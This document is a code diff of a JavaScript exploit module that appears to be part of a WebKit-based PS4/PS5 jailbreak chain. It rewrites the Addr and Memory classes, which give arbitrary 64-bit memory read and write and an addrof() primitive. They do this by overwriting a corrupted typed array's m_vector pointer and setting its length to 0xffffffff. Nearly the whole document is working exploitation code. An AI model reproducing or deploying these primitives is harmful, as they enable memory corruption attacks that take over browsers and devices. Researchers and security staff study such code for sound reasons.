@@ -15,214 +15,340 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-import { Int } from './int64.mjs';
-import {
-    read16,
-    read32,
-    read64,
-    write16,
-    write32,
-    write64,
-} from './rw.mjs';
-import * as o from './offset.mjs';
+import { Int, lohi_from_one } from './int64.mjs';
+import { view_m_vector, view_m_length } from './offset.mjs';
 
 export let mem = null;
+
+// cache some constants
+const off_vector = view_m_vector / 4;
+const off_vector2 = (view_m_vector + 4) / 4;
+const isInteger = Number.isInteger;
 
 function init_module(memory) {
     mem = memory;
 }
 
+function add_and_set_addr(mem, offset, base_lo, base_hi) {
+    const values = lohi_from_one(offset);
+    const main = mem._main;
+
+    const low = base_lo + values[0];
+
+    // no need to use ">>> 0" to convert to unsigned here
+    main[off_vector] = low;
+    main[off_vector2] = base_hi + values[1] + (low > 0xffffffff);
+}
+
 export class Addr extends Int {
     read8(offset) {
-        const addr = this.add(offset);
-        return mem.read8(addr);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
+
+        return m.read8_at(offset);
     }
 
     read16(offset) {
-        const addr = this.add(offset);
-        return mem.read16(addr);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
+
+        return m.read16_at(offset);
     }
 
     read32(offset) {
-        const addr = this.add(offset);
-        return mem.read32(addr);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
+
+        return m.read32_at(offset);
     }
 
     read64(offset) {
-        const addr = this.add(offset);
-        return mem.read64(addr);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
+
+        return m.read64_at(offset);
     }
 
-    // returns a pointer instead of an Int
     readp(offset) {
-        const addr = this.add(offset);
-        return mem.readp(addr);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
+
+        return m.readp_at(offset);
     }
 
     write8(offset, value) {
-        const addr = this.add(offset);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
 
-        mem.write8(addr, value);
+        m.write8_at(offset, value);
     }
 
     write16(offset, value) {
-        const addr = this.add(offset);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
 
-        mem.write16(addr, value);
+        m.write16_at(offset, value);
     }
 
     write32(offset, value) {
-        const addr = this.add(offset);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
 
-        mem.write32(addr, value);
+        m.write32_at(offset, value);
     }
 
     write64(offset, value) {
-        const addr = this.add(offset);
+        const m = mem;
+        if (isInteger(offset) && 0 <= offset && offset <= 0xffffffff) {
+            m._set_addr_direct(this);
+        } else {
+            add_and_set_addr(m, offset, this.low, this.high);
+            offset = 0;
+        }
 
-        mem.write64(addr, value);
+        m.write64_at(offset, value);
     }
 }
 
-class MemoryBase {
-    _addrof(obj) {
-        if (typeof obj !== 'object'
-            && typeof obj !== 'function'
+// expected:
+// * main - Uint32Array whose m_vector points to worker
+// * worker - DataView
+//
+// addrof() expectations:
+// * obj - we will store objects at .addr
+// * addr_addr - Int where to read out the address. the address used to store
+//   the value of .addr
+//
+// the relative read/write methods expect the offset to be a unsigned 32-bit
+// integer
+export class Memory {
+    constructor(main, worker, obj, addr_addr)  {
+        this._main = main;
+        this._worker = worker;
+        this._obj = obj;
+        this._addr_low = addr_addr.low;
+        this._addr_high = addr_addr.high;
+
+        main[view_m_length / 4] = 0xffffffff;
+
+        init_module(this);
+    }
+
+    addrof(object) {
+        // typeof considers null as a object. blacklist it as it isn't a
+        // JSObject
+        if ((typeof object !== 'object' || object === null)
+            && typeof object !== 'function'
         ) {
-            throw TypeError('addrof argument not a JS object');
+            throw TypeError('argument not a JS object');
         }
-        this.worker.a = obj;
-        write64(this.main, o.view_m_vector, this.butterfly.sub(0x10));
-        let res = read64(this.worker, 0);
-        write64(this.main, o.view_m_vector, this._current_addr);
+
+        const obj = this._obj;
+        const worker = this._worker;
+        const main = this._main;
+
+        obj.addr = object;
+
+        main[off_vector] = this._addr_low;
+        main[off_vector2] = this._addr_high;
+
+        const res = new Addr(
+            worker.getUint32(0, true),
+            worker.getUint32(4, true),
+        );
+        obj.addr = null;
 
         return res;
     }
 
-    addrof(obj) {
-        return new Addr(this._addrof(obj));
+    // expects addr to be a Int
+    _set_addr_direct(addr) {
+        const main = this._main;
+        main[off_vector] = addr.low;
+        main[off_vector2] = addr.high;
     }
 
     set_addr(addr) {
-        if (!(addr instanceof Int)) {
-            throw TypeError('addr must be an Int');
-        }
-        this._current_addr = addr;
-        write64(this.main, o.view_m_vector, this._current_addr);
+        const values = lohi_from_one(addr);
+        const main = this._main;
+        main[off_vector] = values[0];
+        main[off_vector2] = values[1];
     }
 
     get_addr() {
-        return this._current_addr;
-    }
-
-    // write0() is for when you want to write to address 0. You can't use for
-    // example: "mem.write32(Int.Zero, 0)", since you can't set by index the
-    // view when it isDetached(). isDetached() == true when m_mode >=
-    // WastefulTypedArray and m_vector == 0.
-    //
-    // Functions like write32() will index mem.worker via write() from rw.mjs.
-    //
-    // size is the number of bits to read/write.
-    //
-    // The constraint is 0 <= offset + 1 < 2**32.
-    //
-    // PS4 firmwares >= 9.00 and any PS5 version can write to address 0
-    // directly. All firmwares (PS4 and PS5) can read address 0 directly.
-    //
-    // See setIndex() from
-    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
-    // 8.03 for more information. Affected firmwares will get this error:
-    //
-    // TypeError: Underlying ArrayBuffer has been detached from the view
-    write0(size, offset, value) {
-        const i = offset + 1;
-        if (i >= 2**32 || i < 0) {
-            throw RangeError(`read0() invalid offset: ${offset}`);
-        }
-
-        this.set_addr(new Int(-1));
-
-        switch (size) {
-            case 8: {
-                this.worker[i] = value;
-            }
-            case 16: {
-                write16(this.worker, i, value);
-            }
-            case 32: {
-                write32(this.worker, i, value);
-            }
-            case 64: {
-                write64(this.worker, i, value);
-            }
-            default: {
-                throw RangeError(`write0() invalid size: ${size}`);
-            }
-        }
+        return new Addr(main[off_vector], main[off_vector2]);
     }
 
     read8(addr) {
         this.set_addr(addr);
-        return this.worker[0];
+        return this._worker.getUint8(0);
     }
 
     read16(addr) {
         this.set_addr(addr);
-        return read16(this.worker, 0);
+        return this._worker.getUint16(0, true);
     }
 
     read32(addr) {
         this.set_addr(addr);
-        return read32(this.worker, 0);
+        return this._worker.getUint32(0, true);
     }
 
     read64(addr) {
         this.set_addr(addr);
-        return read64(this.worker, 0);
+        const worker = this._worker;
+        return new Int(worker.getUint32(0, true), worker.getUint32(4, true));
     }
 
     // returns a pointer instead of an Int
     readp(addr) {
-        return new Addr(this.read64(addr));
+        this.set_addr(addr);
+        const worker = this._worker;
+        return new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
     }
+
+    read8_at(offset) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        return this._worker.getUint8(offset);
+    }
+
+    read16_at(offset) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        return this._worker.getUint16(offset, true);
+    }
+
+    read32_at(offset) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        return this._worker.getUint32(offset, true);
+    }
+
+    read64_at(offset) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        const worker = this._worker;
+        return new Int(
+            worker.getUint32(offset, true),
+            worker.getUint32(offset + 4, true),
+        );
+    }
+
+    readp_at(offset) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        const worker = this._worker;
+        return new Addr(
+            worker.getUint32(offset, true),
+            worker.getUint32(offset + 4, true),
+        );
+    }
+
+    // writes using 0 as a base address don't work because we are using a
+    // DataView as a worker. work around this by doing something like "new
+    // Addr(-1, -1).write8(1, 0)"
+    //
+    // see setIndex() from
+    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
+    // 8.00
 
     write8(addr, value) {
         this.set_addr(addr);
-        this.worker[0] = value;
+        this._worker.setUint8(0, value);
     }
 
     write16(addr, value) {
         this.set_addr(addr);
-        write16(this.worker, 0, value);
+        this._worker.setUint16(0, value, true);
     }
 
     write32(addr, value) {
         this.set_addr(addr);
-        write32(this.worker, 0, value);
+        this._worker.setUint32(0, value, true);
     }
 
     write64(addr, value) {
+        const values = lohi_from_one(value);
         this.set_addr(addr);
-        write64(this.worker, 0, value);
+        const worker = this._worker;
+        worker.setUint32(0, values[0], true);
+        worker.setUint32(4, values[1], true);
     }
-}
 
-export class Memory extends MemoryBase {
-    constructor(main, worker)  {
-        super();
+    write8_at(offset, value) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        this._worker.setUint8(offset, value);
+    }
 
-        this.main = main;
-        this.worker = worker;
+    write16_at(offset, value) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        this._worker.setUint16(offset, value, true);
+    }
 
-        // The initial creation of the "a" property will change the butterfly
-        // address. Do it now so we can cache it for addrof().
-        worker.a = 0; // dummy value, we just want to create the "a" property
-        this.butterfly = read64(main, o.js_butterfly);
+    write32_at(offset, value) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        this._worker.setUint32(offset, value, true);
+    }
 
-        write32(main, o.view_m_length, 0xffffffff);
-
-        this._current_addr = Int.Zero;
-
-        init_module(this);
+    write64_at(offset, value) {
+        if (!isInteger(offset)) {
+            throw TypeError('offset not a integer');
+        }
+        const values = lohi_from_one(value);
+        const worker = this._worker;
+        worker.setUint32(offset, values[0], true);
+        worker.setUint32(offset + 4, values[1], true);
     }
 }
